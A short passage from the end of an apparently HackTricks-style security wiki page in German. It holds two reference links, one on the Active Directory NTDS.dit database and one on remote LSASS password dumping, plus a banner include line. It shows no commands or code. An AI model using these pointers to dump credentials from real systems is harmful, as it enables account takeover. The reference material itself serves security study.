- [8] [Wie der Active-Directory-Datenspeicher wirklich funktioniert: Einblicke in NTDS.dit (Teil 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote-Lsass-Dump von Passwörtern](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
